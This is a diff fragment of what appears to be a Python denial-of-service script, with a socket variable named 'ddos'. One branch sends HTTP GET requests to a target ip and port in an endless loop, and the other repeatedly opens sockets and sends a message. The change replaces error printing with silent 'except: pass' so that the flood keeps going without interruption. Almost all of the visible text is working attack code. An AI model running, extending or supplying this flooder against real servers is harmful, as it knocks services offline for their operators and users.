@@ -21,8 +21,8 @@ if type == "GET":
     try:
         while True:
             r.get(f"{ip}:{port}")
-    except Exception as e:
-       print(e)
+    except:
+        pass
 elif type == "socket":
     ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
@@ -30,5 +30,5 @@ elif type == "socket":
             ddos.connect((ip, port))
             ddos.send( message )
             ddos.close()
-    except Exception as e:
-        print(e)
+    except:
+        pass
